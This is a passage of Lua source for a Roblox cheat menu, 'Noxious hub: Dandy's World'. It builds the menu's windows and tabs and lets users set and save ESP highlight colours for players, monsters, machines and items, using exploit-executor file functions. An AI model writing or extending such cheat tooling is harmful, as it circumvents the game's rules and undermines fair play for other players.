	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	noxious["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatemainframeinput(input)
			end
		end
	end)
end
dragmainframe2()

function synchronizePositions(frame1, frame2)
	frame1:GetPropertyChangedSignal("Position"):Connect(function()
		if mainframe2.Visible == false then frame2.Position = frame1.Position end
	end)

	frame2:GetPropertyChangedSignal("Position"):Connect(function()
		if mainframe.Visible == false then frame1.Position = frame2.Position end
	end)
end

synchronizePositions(mainframe, mainframe2)

-------------------------------------------------------------------------------------------------------------------------------

noxious["bottom frame team icon"] = Instance.new"ImageLabel"
noxious["bottom frame team icon"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["bottom frame team icon"].Position = UDim2.new(0.926, 0, 0.1579, 0)
noxious["bottom frame team icon"].BackgroundTransparency = 0
noxious["bottom frame team icon"].BackgroundColor3 = noxious["default black color"]
noxious["bottom frame team icon"].BorderSizePixel = 1
noxious["bottom frame team icon"].BorderColor3 = noxious["default white color"]
noxious["bottom frame team icon"].Image = "rbxassetid://130584446591314"
noxious["bottom frame team icon"].Parent = noxious["bottom frame"]
noxious["bottom frame team icon"].ImageColor3 = noxious["default white color"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["bottom frame title"] = Instance.new"TextLabel"
noxious["bottom frame title"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
noxious["bottom frame title"].Position = UDim2.new(0, -37, -0.18, 1)
noxious["bottom frame title"].BackgroundTransparency = 1
noxious["bottom frame title"].TextColor3 = noxious["default white color"]
noxious["bottom frame title"].Font = Enum.Font.Nunito
noxious["bottom frame title"].TextSize = 21.6
noxious["bottom frame title"].TextScaled = false
noxious["bottom frame title"].Text = "Noxious hub: Dandy's World"
noxious["bottom frame title"].TextXAlignment = Enum.TextXAlignment.Right
noxious["bottom frame title"].Parent = noxious["bottom frame"]

noxious["bottom frame subtitle"] = Instance.new"TextLabel"
noxious["bottom frame subtitle"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
noxious["bottom frame subtitle"].Position = UDim2.new(0, -37, 0.18, 1)
noxious["bottom frame subtitle"].BackgroundTransparency = 1
noxious["bottom frame subtitle"].TextColor3 = noxious["default gray color"]
noxious["bottom frame subtitle"].Font = Enum.Font.Nunito
noxious["bottom frame subtitle"].TextSize = 18
noxious["bottom frame subtitle"].TextScaled = false
noxious["bottom frame subtitle"].Text = "By Team Noxious & Plethora"
noxious["bottom frame subtitle"].TextXAlignment = Enum.TextXAlignment.Right
noxious["bottom frame subtitle"].Parent = noxious["bottom frame"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["top frame 2"] = Instance.new"Frame"
noxious["top frame 2"].Name = "TopFrame"
noxious["top frame 2"].Size = UDim2.new(0.9999, 0, 0, 52.8)
noxious["top frame 2"].BackgroundColor3 = noxious["default black color"]
noxious["top frame 2"].BorderColor3 = noxious["default white color"]
noxious["top frame 2"].BorderSizePixel = 1
noxious["top frame 2"].Parent = mainframe2

noxious["hide interface button 2"] = Instance.new"TextButton"
noxious["hide interface button 2"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["hide interface button 2"].BackgroundColor3 = noxious["default black color"]
noxious["hide interface button 2"].Position = UDim2.new(0.9256, 0, 0.157, 0)
noxious["hide interface button 2"].BorderColor3 = noxious["default white color"]
noxious["hide interface button 2"].BorderSizePixel = 1
noxious["hide interface button 2"].TextColor3 = noxious["default white color"]
noxious["hide interface button 2"].Font = Enum.Font.Nunito
noxious["hide interface button 2"].TextSize = 20
noxious["hide interface button 2"].TextScaled = false
noxious["hide interface button 2"].Text = "X"
noxious["hide interface button 2"].TextXAlignment = Enum.TextXAlignment.Center
noxious["hide interface button 2"].TextYAlignment = Enum.TextYAlignment.Center
noxious["hide interface button 2"].Parent = noxious["top frame 2"]

noxious["hide interface button 2"].MouseButton1Click:Connect(
	function()
		toggleVisibility()
		noxious["click sound"]:Play()
	end
)

noxious["reposition interface button 2"] = Instance.new"TextButton"
noxious["reposition interface button 2"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["reposition interface button 2"].BackgroundColor3 = noxious["default black color"]
noxious["reposition interface button 2"].Position = UDim2.new(0.8489, 0, 0.158, 0)
noxious["reposition interface button 2"].BorderColor3 = noxious["default white color"]
noxious["reposition interface button 2"].BorderSizePixel = 1
noxious["reposition interface button 2"].TextColor3 = noxious["default white color"]
noxious["reposition interface button 2"].Font = Enum.Font.Nunito
noxious["reposition interface button 2"].TextSize = 20
noxious["reposition interface button 2"].TextScaled = false
noxious["reposition interface button 2"].Text = "R"
noxious["reposition interface button 2"].TextXAlignment = Enum.TextXAlignment.Center
noxious["reposition interface button 2"].TextYAlignment = Enum.TextYAlignment.Center
noxious["reposition interface button 2"].Parent = noxious["top frame 2"]

noxious["reposition interface button 2"].MouseButton1Click:Connect(
	function()
		centermainframe2()
		centermainframe()
		noxious["click sound"]:Play()
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["top frame text 2"] = Instance.new"TextLabel"
noxious["top frame text 2"].Name = "welcome4"
noxious["top frame text 2"].Size = UDim2.new(0.55, 0, 1.1, 0)
noxious["top frame text 2"].Position = UDim2.new(0.08, 4, -0.18, -2)
noxious["top frame text 2"].BackgroundTransparency = 1
noxious["top frame text 2"].TextColor3 = noxious["default white color"]
noxious["top frame text 2"].Font = Enum.Font.Nunito
noxious["top frame text 2"].TextSize = 21.6
noxious["top frame text 2"].TextScaled = false
noxious["top frame text 2"].Text = ""
noxious["top frame text 2"].TextXAlignment = Enum.TextXAlignment.Left
noxious["top frame text 2"].Parent = noxious["top frame 2"]

noxious["top frame subtext 2"] = Instance.new"TextLabel"
noxious["top frame subtext 2"].Name = "welcome3"
noxious["top frame subtext 2"].Size = UDim2.new(0.55, 0, 1.1, 0)
noxious["top frame subtext 2"].Position = UDim2.new(0.08, 4, 0.18, -2)
noxious["top frame subtext 2"].BackgroundTransparency = 1
noxious["top frame subtext 2"].TextColor3 = noxious["default gray color"]
noxious["top frame subtext 2"].Font = Enum.Font.Nunito
noxious["top frame subtext 2"].TextSize = 18
noxious["top frame subtext 2"].TextScaled = false
noxious["top frame subtext 2"].Text = ""
noxious["top frame subtext 2"].TextXAlignment = Enum.TextXAlignment.Left
noxious["top frame subtext 2"].Parent = noxious["top frame 2"]

spawn(function()
	noxious["run service"].RenderStepped:Connect(function()
		noxious["top frame text 2"].Text = noxious["top frame text"].Text
		noxious["top frame subtext 2"].Text = noxious["top frame subtext"].Text
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

noxious["top frame profile picture 2"] = Instance.new"ImageLabel"
noxious["top frame profile picture 2"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["top frame profile picture 2"].Position = UDim2.new(0.013, 0, 0.157, 0)
noxious["top frame profile picture 2"].BackgroundTransparency = 0
noxious["top frame profile picture 2"].BackgroundColor3 = noxious["default black color"]
noxious["top frame profile picture 2"].BorderSizePixel = 1
noxious["top frame profile picture 2"].BorderColor3 = noxious["default white color"]
noxious["top frame profile picture 2"].Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png"
noxious["top frame profile picture 2"].Parent = noxious["top frame 2"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["bottom frame 2"] = Instance.new"Frame"
noxious["bottom frame 2"].Size = UDim2.new(0, 594, 0, 52.8)
noxious["bottom frame 2"].Position = UDim2.new(0, 0, 0.7, 54)
noxious["bottom frame 2"].BackgroundColor3 = noxious["default black color"]
noxious["bottom frame 2"].BorderColor3 = noxious["default white color"]
noxious["bottom frame 2"].BorderSizePixel = 1
noxious["bottom frame 2"].Parent = mainframe2

-------------------------------------------------------------------------------------------------------------------------------

noxious["bottom frame team icon 2"] = Instance.new"ImageLabel"
noxious["bottom frame team icon 2"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["bottom frame team icon 2"].Position = UDim2.new(0.926, 0, 0.1579, 0)
noxious["bottom frame team icon 2"].BackgroundTransparency = 0
noxious["bottom frame team icon 2"].BackgroundColor3 = noxious["default black color"]
noxious["bottom frame team icon 2"].BorderSizePixel = 1
noxious["bottom frame team icon 2"].BorderColor3 = noxious["default white color"]
noxious["bottom frame team icon 2"].Image = "rbxassetid://130584446591314"
noxious["bottom frame team icon 2"].Parent = noxious["bottom frame 2"]
noxious["bottom frame team icon 2"].ImageColor3 = noxious["default white color"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["bottom frame title 2"] = Instance.new"TextLabel"
noxious["bottom frame title 2"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
noxious["bottom frame title 2"].Position = UDim2.new(0, -37, -0.18, 1)
noxious["bottom frame title 2"].BackgroundTransparency = 1
noxious["bottom frame title 2"].TextColor3 = noxious["default white color"]
noxious["bottom frame title 2"].Font = Enum.Font.Nunito
noxious["bottom frame title 2"].TextSize = 21.6
noxious["bottom frame title 2"].TextScaled = false
noxious["bottom frame title 2"].Text = "Noxious hub: Dandy's World"
noxious["bottom frame title 2"].TextXAlignment = Enum.TextXAlignment.Right
noxious["bottom frame title 2"].Parent = noxious["bottom frame 2"]

noxious["bottom frame subtitle 2"] = Instance.new"TextLabel"
noxious["bottom frame subtitle 2"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
noxious["bottom frame subtitle 2"].Position = UDim2.new(0, -37, 0.18, 1)
noxious["bottom frame subtitle 2"].BackgroundTransparency = 1
noxious["bottom frame subtitle 2"].TextColor3 = noxious["default gray color"]
noxious["bottom frame subtitle 2"].Font = Enum.Font.Nunito
noxious["bottom frame subtitle 2"].TextSize = 18
noxious["bottom frame subtitle 2"].TextScaled = false
noxious["bottom frame subtitle 2"].Text = "By Team Noxious & Plethora"
noxious["bottom frame subtitle 2"].TextXAlignment = Enum.TextXAlignment.Right
noxious["bottom frame subtitle 2"].Parent = noxious["bottom frame 2"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["settings button"] = Instance.new"TextButton"
noxious["settings button"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["settings button"].BackgroundColor3 = noxious["default black color"]
noxious["settings button"].Position = UDim2.new(0, 458, 0.158, 0)
noxious["settings button"].BorderColor3 = noxious["default white color"]
noxious["settings button"].BorderSizePixel = 1
noxious["settings button"].TextColor3 = noxious["default white color"]
noxious["settings button"].Font = Enum.Font.Nunito
noxious["settings button"].TextSize = 20
noxious["settings button"].TextScaled = false
noxious["settings button"].Text = "S"
noxious["settings button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["settings button"].TextYAlignment = Enum.TextYAlignment.Center
noxious["settings button"].Parent = noxious["top frame"]

noxious["main button"] = Instance.new"TextButton"
noxious["main button"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["main button"].BackgroundColor3 = noxious["default black color"]
noxious["main button"].Position = UDim2.new(0, 412, 0.158, 0)
noxious["main button"].BorderColor3 = noxious["default white color"]
noxious["main button"].BorderSizePixel = 1
noxious["main button"].TextColor3 = noxious["default white color"]
noxious["main button"].Font = Enum.Font.Nunito
noxious["main button"].TextSize = 20
noxious["main button"].TextScaled = false
noxious["main button"].Text = "M"
noxious["main button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["main button"].TextYAlignment = Enum.TextYAlignment.Center
noxious["main button"].Parent = noxious["top frame"]

noxious["settings button 2"] = Instance.new"TextButton"
noxious["settings button 2"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["settings button 2"].BackgroundColor3 = noxious["default black color"]
noxious["settings button 2"].Position = UDim2.new(0, 458, 0.158, 0)
noxious["settings button 2"].BorderColor3 = noxious["default white color"]
noxious["settings button 2"].BorderSizePixel = 1
noxious["settings button 2"].TextColor3 = noxious["default white color"]
noxious["settings button 2"].Font = Enum.Font.Nunito
noxious["settings button 2"].TextSize = 20
noxious["settings button 2"].TextScaled = false
noxious["settings button 2"].Text = "S"
noxious["settings button 2"].TextXAlignment = Enum.TextXAlignment.Center
noxious["settings button 2"].TextYAlignment = Enum.TextYAlignment.Center
noxious["settings button 2"].Parent = noxious["top frame 2"]

noxious["main button 2"] = Instance.new"TextButton"
noxious["main button 2"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["main button 2"].BackgroundColor3 = noxious["default black color"]
noxious["main button 2"].Position = UDim2.new(0, 412, 0.158, 0)
noxious["main button 2"].BorderColor3 = noxious["default white color"]
noxious["main button 2"].BorderSizePixel = 1
noxious["main button 2"].TextColor3 = noxious["default white color"]
noxious["main button 2"].Font = Enum.Font.Nunito
noxious["main button 2"].TextSize = 20
noxious["main button 2"].TextScaled = false
noxious["main button 2"].Text = "M"
noxious["main button 2"].TextXAlignment = Enum.TextXAlignment.Center
noxious["main button 2"].TextYAlignment = Enum.TextYAlignment.Center
noxious["main button 2"].Parent = noxious["top frame 2"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["tabs frame 2"] = Instance.new"Frame"
noxious["tabs frame 2"].Size = UDim2.new(0.9999, 0, 0, 26.4)
noxious["tabs frame 2"].Position = UDim2.new(0, 0, 0, 53)
noxious["tabs frame 2"].BackgroundColor3 = noxious["default black color"]
noxious["tabs frame 2"].BorderColor3 = noxious["default white color"]
noxious["tabs frame 2"].BorderSizePixel = 1
noxious["tabs frame 2"].Parent = noxious["top frame 2"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["configuration tab"] = Instance.new"TextButton"
noxious["configuration tab"].Size = UDim2.new(0, 297, 0, 26.4)
noxious["configuration tab"].Position = UDim2.new(0, 0, 0, 0)
noxious["configuration tab"].BackgroundColor3 = noxious["default black color"]
noxious["configuration tab"].BorderColor3 = noxious["default white color"]
noxious["configuration tab"].BorderSizePixel = 1
noxious["configuration tab"].Parent = noxious["tabs frame 2"]
noxious["configuration tab"].TextColor3 = noxious["default white color"]
noxious["configuration tab"].Font = Enum.Font.Nunito
noxious["configuration tab"].TextSize = 20
noxious["configuration tab"].TextScaled = false
noxious["configuration tab"].Text = "> Configuration <"
noxious["configuration tab"].TextXAlignment = Enum.TextXAlignment.Center
noxious["configuration tab"].TextYAlignment = Enum.TextYAlignment.Center

noxious["configuration tab"].MouseButton1Click:Connect(
	function()
		noxious["script settings tab"].Text = "Script Settings"
		noxious["configuration tab"].Text = "> Configuration <"
		noxious["script settings holder"].Visible = false
		noxious["settings holder"].Visible = true
		noxious["click sound"]:Play()
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["script settings tab"] = Instance.new"TextButton"
noxious["script settings tab"].Size = UDim2.new(0.50, 0, 0, 26.4)
noxious["script settings tab"].Position = UDim2.new(0.5, 0, 0, 0)
noxious["script settings tab"].BackgroundColor3 = noxious["default black color"]
noxious["script settings tab"].BorderColor3 = noxious["default white color"]
noxious["script settings tab"].BorderSizePixel = 1
noxious["script settings tab"].Parent = noxious["tabs frame 2"]
noxious["script settings tab"].TextColor3 = noxious["default white color"]
noxious["script settings tab"].Font = Enum.Font.Nunito
noxious["script settings tab"].TextSize = 20
noxious["script settings tab"].TextScaled = false
noxious["script settings tab"].Text = "Script Settings"
noxious["script settings tab"].TextXAlignment = Enum.TextXAlignment.Center
noxious["script settings tab"].TextYAlignment = Enum.TextYAlignment.Center

noxious["script settings tab"].MouseButton1Click:Connect(
	function()
		noxious["script settings tab"].Text = "> Script Settings <"
		noxious["configuration tab"].Text = "Configuration"
		noxious["script settings holder"].Visible = true
		noxious["settings holder"].Visible = false
		noxious["click sound"]:Play()
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["settings holder"] = Instance.new"ScrollingFrame"
noxious["settings holder"].Visible = true
noxious["settings holder"].Size = UDim2.new(1, 0, 0, 204)
noxious["settings holder"].Position = UDim2.new(0, 0, 0, 80)
noxious["settings holder"].CanvasSize = UDim2.new(0, 0, 0, 0)
noxious["settings holder"].ScrollBarThickness = 10
noxious["settings holder"].ScrollBarImageColor3 = noxious["default white color"]
noxious["settings holder"].BackgroundTransparency = 1
noxious["settings holder"].BorderSizePixel = 0
noxious["settings holder"].BorderColor3 = noxious["default white color"]
noxious["settings holder"].ScrollingDirection = Enum.ScrollingDirection.Y
noxious["settings holder"].Parent = mainframe2

-- Function to update canvas size
function updateCanvasSize()
	local totalHeight = 0
	for _, child in ipairs(noxious["settings holder"]:GetChildren()) do
		if child:IsA("Frame") then
			totalHeight = totalHeight + child.Size.Y.Offset + 8 -- Add some padding
		end
	end
	noxious["settings holder"].CanvasSize = UDim2.new(0, 0, 0, totalHeight + 26) -- Extra padding at bottom
end

-- ESP Color Settings with Working Save/Load
local ESP_COLORS_FILE = "DSWDNoxiousSettings.json"

-- Default colors with fallback protection
local defaultColors = {
	Player = Color3.fromRGB(0, 0, 255),
	Monster = Color3.fromRGB(255, 0, 0),
	Machine = Color3.fromRGB(110, 110, 110),
	CompletedMachine = Color3.fromRGB(255, 0, 255),
	PosessedMachine = Color3.fromRGB(0, 255, 255),
	Item = Color3.fromRGB(0, 255, 0),
	FakeCapsule = Color3.fromRGB(255, 255, 0),
	FakeElevator = Color3.fromRGB(255, 255, 0),
	Heals = Color3.fromRGB(176, 38, 255),
	ExtractionItems = Color3.fromRGB(255, 100, 0)
}

-- Current colors with loading system
local espColors = {}
for k,v in pairs(defaultColors) do
	espColors[k] = v
end

-- Robust save function
function saveColors()
	local colorData = {}
	for name, color in pairs(espColors) do
		if typeof(color) == "Color3" then
			colorData[name] = {
				R = math.floor(color.R * 255),
				G = math.floor(color.G * 255),
				B = math.floor(color.B * 255)
			}
		end
	end

	pcall(function()
		local json = game:GetService("HttpService"):JSONEncode(colorData)
		writefile(ESP_COLORS_FILE, json)
	end)
end

function loadColors()
	if not pcall(function() return isfile(ESP_COLORS_FILE) end) then 
		-- warn("No saved colors file found")
		return 
	end

	local fileContents
	local success, err = pcall(function()
		fileContents = readfile(ESP_COLORS_FILE)
	end)

	if not success or not fileContents then
		-- warn("Failed to read colors file: "..tostring(err))
		return
	end

	local colorData
	success, err = pcall(function()
		colorData = game:GetService("HttpService"):JSONDecode(fileContents)
	end)

	if not success or not colorData then
		-- warn("Failed to decode colors: "..tostring(err))
		return
	end

	-- Validate and load each color
	for name, rgb in pairs(colorData) do
		if defaultColors[name] then
			local r = tonumber(rgb.R) or 0
			local g = tonumber(rgb.G) or 0
			local b = tonumber(rgb.B) or 0

			espColors[name] = Color3.fromRGB(
				math.clamp(r, 0, 255),
				math.clamp(g, 0, 255),
				math.clamp(b, 0, 255)
			)
		end
	end
end

-- Initialize colors
loadColors()

-- Apply loaded colors to global variables
espcPlayer = espColors.Player
espcMonster = espColors.Monster
espcMachine = espColors.Machine
espcCompletedMachine = espColors.CompletedMachine
espcPosessedMachine = espColors.PosessedMachine
espcItem = espColors.Item
espcFakeCapsule = espColors.FakeCapsule
espcFakeElevator = espColors.FakeElevator
espcHeals = espColors.Heals
espcExtractionItems = espColors.ExtractionItems

-- Safe color getter for highlights
function getHighlightColor(colorType)
	-- First check if we have a saved color
	if espColors[colorType] and typeof(espColors[colorType]) == "Color3" then
		return espColors[colorType]
	end
	-- Fallback to default
	if defaultColors[colorType] and typeof(defaultColors[colorType]) == "Color3" then
		return defaultColors[colorType]
	end
	-- Ultimate fallback (should never happen)
	-- warn("Missing color for "..tostring(colorType))
	return Color3.fromRGB(255, 0, 255) -- Magenta for visibility
end

-- Modified addSettingFrame with proper color handling
function addSettingFrame(title, espType, subtext, targetVariableName, refreshFunction)
	-- Create frame
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, -27, 0, 60)
	frame.Position = UDim2.new(0, 8, 0, #noxious["settings holder"]:GetChildren() * 70 + 8)
	frame.BackgroundTransparency = 0
	frame.BackgroundColor3 = noxious["default black color"]
	frame.BorderColor3 = noxious["default white color"]
	frame.Parent = noxious["settings holder"]
	frame.ZIndex = 1

	-- Add title and subtext
	local titleLabel = Instance.new("TextLabel")
	titleLabel.Text = title
	titleLabel.Font = Enum.Font.Nunito
	titleLabel.TextSize = 20
	titleLabel.TextColor3 = noxious["default white color"]
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.Position = UDim2.new(0, 10, 0, 11)
	titleLabel.Size = UDim2.new(0.6, -10, 0, 20)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Parent = frame
	titleLabel.ZIndex = 2

	local subtextLabel = Instance.new("TextLabel")
	subtextLabel.Text = subtext
	subtextLabel.Font = Enum.Font.Nunito
	subtextLabel.TextSize = 15
	subtextLabel.TextColor3 = noxious["default gray color"]
	subtextLabel.TextXAlignment = Enum.TextXAlignment.Left
	subtextLabel.Position = UDim2.new(0, 10, 0, 30)
	subtextLabel.Size = UDim2.new(0.6, -10, 0, 20)
	subtextLabel.BackgroundTransparency = 1
	subtextLabel.Parent = frame
	subtextLabel.ZIndex = 2

	-- Color frame showing current color
	local colorFrame = Instance.new("Frame")
	colorFrame.Size = UDim2.new(0, 30, 0, 30)
	colorFrame.Position = UDim2.new(1, -182, 0.5, -15)
	colorFrame.BackgroundColor3 = espColors[espType]
	colorFrame.BorderSizePixel = 1
	colorFrame.BorderColor3 = noxious["default white color"]
	colorFrame.Parent = frame

	-- Textbox for RGB input
	local textBox = Instance.new("TextBox")
	textBox.Size = UDim2.new(0, 120, 0, 30)
	textBox.Position = UDim2.new(1, -135, 0.5, -15)
	textBox.PlaceholderText = "R, G, B"
	textBox.Font = Enum.Font.Nunito
	textBox.PlaceholderColor3 = noxious["default gray color"]
	textBox.TextSize = 20
	textBox.Text = string.format("%d, %d, %d", 
		math.floor(espColors[espType].R * 255),
		math.floor(espColors[espType].G * 255),
		math.floor(espColors[espType].B * 255))
	textBox.TextColor3 = noxious["default white color"]
	textBox.BackgroundColor3 = noxious["default black color"]
	textBox.BorderSizePixel = 1
	textBox.BorderColor3 = noxious["default white color"]
	textBox.Parent = frame
	textBox.ZIndex = 3

	-- Color update handler
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local r, g, b = textBox.Text:match("^(%d+),%s*(%d+),%s*(%d+)$")
			r, g, b = tonumber(r), tonumber(g), tonumber(b)

			if r and g and b then
				local newColor = Color3.fromRGB(
					math.clamp(r, 0, 255),
					math.clamp(g, 0, 255),
					math.clamp(b, 0, 255)
				)

				-- Update all color storage
				espColors[espType] = newColor
				_G[targetVariableName] = newColor
				colorFrame.BackgroundColor3 = newColor

				-- Save and refresh
				saveColors()
				if refreshFunction then
					pcall(refreshFunction)
				end
			else
				-- Reset to current color
				textBox.Text = string.format("%d, %d, %d", 
					math.floor(getHighlightColor(espType).R * 255),
					math.floor(getHighlightColor(espType).G * 255),
					math.floor(getHighlightColor(espType).B * 255))
			end
		end
	end)
	updateCanvasSize()
end

-- Add ESP color settings frames with save support
addSettingFrame(
	"Player ESP Color", 
	"Player",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.Player,
	function(color)
		defaultColors.Player = color
		disableEsp("Players")
		enableEsp("Players")
	end
)

addSettingFrame(
	"Monster ESP Color", 
	"Monster",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.Monster,
	function(color)
		defaultColors.Monster = color
		disableEsp("Monsters")
		enableEsp("Monsters")
	end
)

addSettingFrame(
	"Machine ESP Color", 
	"Machine",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.Machine,
	function(color)
		defaultColors.Machine = color
		disableEsp("Machines")
		enableEsp("Machines")
	end
)

addSettingFrame(
	"Completed Machine ESP Color", 
	"CompletedMachine",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.CompletedMachine,
	function(color)
		defaultColors.CompletedMachine = color
		disableEsp("Machines")
		enableEsp("Machines")
	end
)

addSettingFrame(
	"Posessed Machine ESP Color", 
	"PosessedMachine",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.PosessedMachine,
	function(color)
		defaultColors.PosessedMachine = color
		disableEsp("Machines")
		enableEsp("Machines")
	end
)

addSettingFrame(
	"Item ESP Color", 
	"Item",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.Item,
	function(color)
		defaultColors.Item = color
		disableEsp("Items")
		enableEsp("Items")
	end
)

addSettingFrame(
	"Fake Capsule ESP Color", 
	"FakeCapsule",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.FakeCapsule,
	function(color)
		defaultColors.FakeCapsule = color
		disableEsp("Items")
		enableEsp("Items")
	end
)

addSettingFrame(
	"Fake Elevator ESP Color", 
	"FakeElevator",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.FakeElevator,
	function(color)
		defaultColors.FakeElevator = color
		disableEsp("FakeElevator")
		enableEsp("FakeElevator")
	end
)

addSettingFrame(
	"Heals ESP Color", 
	"Heals",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.Heals,
	function(color)
		defaultColors.Heals = color
		disableEsp("Items")
		enableEsp("Items")
	end
)

addSettingFrame(
	"Extraction Items ESP Color", 
	"ExtractionItems",
	"Enter an RGB value and press enter to change the specified ESP color.", 
	defaultColors.ExtractionItems,
	function(color)
		defaultColors.ExtractionItems = color
		disableEsp("Items")
		enableEsp("Items")
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["script settings holder"] = Instance.new"ScrollingFrame"
noxious["script settings holder"].Visible = false
noxious["script settings holder"].Size = UDim2.new(1, 0, 0, 204)
noxious["script settings holder"].Position = UDim2.new(0, 0, 0, 80)
noxious["script settings holder"].CanvasSize = UDim2.new(0, 0, 0, 0) -- Will adjust dynamically
noxious["script settings holder"].ScrollBarThickness = 10
noxious["script settings holder"].ScrollBarImageColor3 = noxious["default white color"]
noxious["script settings holder"].BackgroundTransparency = 1
noxious["script settings holder"].BorderSizePixel = 0
noxious["script settings holder"].BorderColor3 = noxious["default white color"]
noxious["script settings holder"].ScrollingDirection = Enum.ScrollingDirection.Y
noxious["script settings holder"].Parent = mainframe2

-- Configuration file path
local CONFIG_FILE = "NoxiousScriptConfiguration.json"

-- Default configuration
local defaultConfig = {
	ptlog = true,
	simpleesp = false,
	ptcleartextbox = false,
	notificationSound = "8503529139",
	warningSound = "5914602124",
	errorSound = "489103549",
	clickSound = "421058925"
}

-- Current configuration
local config = {}

function loadConfig()
	if not isfile(CONFIG_FILE) then
		return defaultConfig
	end

	local success, result = pcall(function()
		return game:GetService("HttpService"):JSONDecode(readfile(CONFIG_FILE))
	end)

	if success then
		-- Merge with default config to ensure all fields exist
		local merged = table.clone(defaultConfig)
		for k, v in pairs(result) do
			merged[k] = v
		end
		return merged
	else

		return defaultConfig
	end
end

-- Function to save configuration
function saveConfig()
	local success, err =pcall(function()
		writefile(CONFIG_FILE, game:GetService("HttpService"):JSONEncode(config))
	end)

	if not success then

	end
end

if game.PlaceId ~= noxious["test game"] then
	config = loadConfig()

	-- Apply loaded config to variables
	ptlog = config.ptlog
	simpleesp = config.simpleesp
	ptcleartextbox = config.ptcleartextbox
end

-- Function to add a frame to the settings holder
function addScriptSettingFrame(title, subtext, onofftoggle, RGBcolor, id, defaultColor, imageid, audioid, defaultid, defaultToggleState, themetextbox, defaulttheme, toggleCallback, colorCallback, imageCallback, audioCallback, themeCallback)
	-- Create the main frame
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, -27, 0, 60) -- Width: Full width with padding, Height: Fixed
	frame.Position = UDim2.new(0, 8, 0, #noxious["script settings holder"]:GetChildren() * 70 + 8) -- Position dynamically
	frame.BackgroundTransparency = 0
	frame.BackgroundColor3 = noxious["default black color"]
	frame.BorderColor3 = noxious["default white color"]
	frame.Parent = noxious["script settings holder"]
	frame.ZIndex = 1

	-- Add title text
	local titleLabel = Instance.new("TextLabel")
	titleLabel.Text = title
	titleLabel.Font = Enum.Font.Nunito
	titleLabel.TextSize = 20
	titleLabel.TextColor3 = noxious["default white color"]
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.Position = UDim2.new(0, 10, 0, 11)
	titleLabel.Size = UDim2.new(0.6, -10, 0, 20)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Parent = frame
	titleLabel.ZIndex = 2

	-- Add subtext
	local subtextLabel = Instance.new("TextLabel")
	subtextLabel.Text = subtext
	subtextLabel.Font = Enum.Font.Nunito
	subtextLabel.TextSize = 15
	subtextLabel.TextColor3 = noxious["default gray color"]
	subtextLabel.TextXAlignment = Enum.TextXAlignment.Left
	subtextLabel.Position = UDim2.new(0, 10, 0, 30)
	subtextLabel.Size = UDim2.new(0.6, -10, 0, 20)
	subtextLabel.BackgroundTransparency = 1
	subtextLabel.Parent = frame
	subtextLabel.ZIndex = 2

	-- Add on/off toggle button (if enabled)
	if onofftoggle then
		local toggleButton = Instance.new("TextButton")
		toggleButton.Size = UDim2.new(0, 70, 0, 30)
		toggleButton.Position = UDim2.new(1, -85, 0.5, -15) -- Right side
		toggleButton.Text = defaultToggleState or "Off" -- Set default toggle state
		toggleButton.Font = Enum.Font.Nunito
		toggleButton.TextSize = 20
		toggleButton.TextColor3 = noxious["default white color"] -- Default white color
		toggleButton.BackgroundColor3 = noxious["default black color"] -- Dark gray
		toggleButton.BorderSizePixel = 1
		toggleButton.BorderColor3 = noxious["default white color"]
		toggleButton.Parent = frame
		toggleButton.ZIndex = 3

		-- Initialize isOn based on defaultToggleState
		local isOn = defaultToggleState == "On"

		-- Call the toggle callback with the initial state
		if toggleCallback then
			toggleCallback(isOn)
		end

		-- Toggle functionality
